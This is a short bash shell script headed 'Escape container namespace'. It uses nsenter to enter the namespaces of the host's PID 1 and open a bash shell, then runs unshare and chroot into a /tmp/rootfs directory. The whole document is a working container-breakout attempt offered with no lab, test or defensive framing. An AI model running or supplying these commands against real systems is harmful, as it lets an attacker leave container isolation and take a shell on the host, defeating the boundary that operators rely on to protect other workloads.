#!/bin/bash
# Escape container namespace
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
unshare --mount --pid --fork bash
chroot /tmp/rootfs /bin/bash
